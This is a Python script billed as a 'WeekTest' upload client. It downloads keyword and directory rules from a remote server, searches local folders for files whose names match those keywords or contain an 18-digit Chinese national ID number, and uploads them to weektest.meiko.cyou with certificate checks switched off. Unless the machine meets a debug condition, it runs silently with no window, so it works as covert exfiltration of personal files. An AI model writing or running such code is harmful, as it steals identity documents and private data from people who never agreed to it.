#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WeekTest 上传客户端  最终版 + 身份证号匹配
"""
import os
import json
import hashlib
import requests
import socket
import pathlib
import threading
import queue
import time
import urllib3
import tkinter as tk
from tkinter import scrolledtext
from datetime import datetime
import re

# ---------------- 配置 ----------------
API_BASE = "https://weektest.meiko.cyou"
RULES_URL = f"{API_BASE}/rules.json"
CHECK_URL = f"{API_BASE}/check_exists.php"
UPLOAD_URL = f"{API_BASE}/upload.php"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# -------------------------------------

UPLOADER_NOTE = (os.getenv("COMPUTERNAME") or
                 os.getenv("USERNAME") or
                 socket.gethostname())

log_queue = queue.Queue()

# ============ 日志 ============
def log(msg: str):
    ts = datetime.now().strftime("%m-%d %H:%M:%S")
    txt = f"[{ts}] {msg}\n"
    print(txt, end="")
    log_queue.put(txt)

# ============ 网络 ============
def wait_for_network():
    while True:
        try:
            r = requests.head(API_BASE, timeout=5, verify=False)
            if r.status_code < 500:
                return
        except Exception:
            pass
        log("[NET] 网络未就绪，30s后重试...")
        time.sleep(30)

# ============ 规则 ============
def load_rules():
    cache = pathlib.Path(__file__).with_name("rules.json")
    wait_for_network()
    try:
        r = requests.get(RULES_URL, timeout=10, verify=False)
        if r.status_code == 200:
            rules = r.json()
            cache.write_text(r.text, encoding="utf-8")
            log("远程规则获取成功")
            return rules
        else:
            log(f"远程返回 {r.status_code}，尝试本地缓存")
    except Exception as e:
        log(f"远程失败 {e}，尝试本地缓存")

    if cache.exists():
        log("使用本地缓存 rules.json")
        return json.loads(cache.read_text(encoding="utf-8"))
    raise RuntimeError("既无远程也无本地缓存，无法加载规则")

# ============ MD5 ============
def calc_md5(file_path: str) -> str:
    h = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()

# ============ 查重 ============
def exists_remote(md5: str) -> bool:
    wait_for_network()
    try:
        r = requests.post(CHECK_URL, data={"md5": md5}, timeout=10, verify=False)
        return r.json().get("exists", False)
    except Exception as e:
        log(f"查重异常：{e}")
        return False

# ============ 上传 ============
def upload_file(file_path: str):
    md5 = calc_md5(file_path)
    if exists_remote(md5):
        log(f"[SKIP] 已存在：{file_path}")
        return

    filename = os.path.basename(file_path)
    file_size = os.path.getsize(file_path) / 1024 / 1024
    log(f"[UPLOAD] 开始上传 {filename}  ({file_size:.2f} MB)")

    with open(file_path, "rb") as f:
        files = {"file": (filename, f)}
        data = {"md5": md5, "note": UPLOADER_NOTE}
        wait_for_network()
        try:
            r = requests.post(UPLOAD_URL, files=files, data=data, timeout=300, verify=False)
        except requests.exceptions.Timeout:
            log(f"[ERROR] 上传超时：{filename}")
            return
        except Exception as e:
            log(f"[ERROR] 上传异常：{e}")
            return

    if r.status_code == 200 and "application/json" in r.headers.get("Content-Type", ""):
        try:
            log(f"[UPLOAD] {filename}  ->  {r.json()}")
        except ValueError:
            log(f"[UPLOAD] {filename} 返回非JSON：{r.text[:200]}")
    else:
        log(f"[UPLOAD] {filename}  HTTP {r.status_code}  {r.text[:200]}")

# ============ 身份证号正则 ============
IDC_PATTERN = re.compile(r'\d{17}[\dXx]')

def has_idc(name: str) -> bool:
    """文件名含18位身份证号返回True"""
    return bool(IDC_PATTERN.search(name))

# ============ 扫描（从新到旧） ============
def scan():
    rules = load_rules()
    kws = rules["keywords"]
    dirs = [os.path.expandvars(d) for d in rules["search_dirs"]]

    candidates = []
    for base in dirs:
        if not os.path.isdir(base):
            continue
        for root, _, files in os.walk(base):
            for name in files:
                # 关键词 或 身份证号 任一命中即入选
                if any(kw in name for kw in kws) or has_idc(name):
                    full = os.path.join(root, name)
                    try:
                        mtime = os.path.getmtime(full)
                        candidates.append((mtime, full))
                    except OSError:
                        pass
    candidates.sort(reverse=True, key=lambda x: x[0])
    log(f"共发现 {len(candidates)} 个文件待上传")
    for _, path in candidates:
        upload_file(path)
    log("扫描上传完成")

# ============ GUI ============
def build_gui() -> tk.Tk:
    root = tk.Tk()
    root.title("WeekTest Uploader")
    root.geometry("800x500")
    log_widget = scrolledtext.ScrolledText(root, wrap=tk.WORD)
    log_widget.pack(fill=tk.BOTH, expand=True)

    def poll_log():
        while True:
            try:
                line = log_queue.get_nowait()
                log_widget.insert(tk.END, line)
                log_widget.see(tk.END)
            except queue.Empty:
                break
        root.after(200, poll_log)

    root.after(200, poll_log)
    return root

# ============ 启动 ============
if __name__ == "__main__":
    def should_show_gui() -> bool:
        if os.getenv("USERNAME", "").upper() == "SEEWO":
            return True
        try:
            import ctypes
            for drv in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                if ctypes.windll.kernel32.GetVolumeInformationW(drv + ":\\", None, 0, None, None, None, None, 0):
                    if pathlib.Path(drv + ":\\debug.ini").is_file():
                        return True
        except Exception:
            pass
        return False

    if should_show_gui():
        root = build_gui()
        log("GUI 模式启动")
        log(f"本机备注：{UPLOADER_NOTE}")
        threading.Thread(target=scan, daemon=True).start()
        root.mainloop()
    else:
        log("静默模式启动")
        scan()
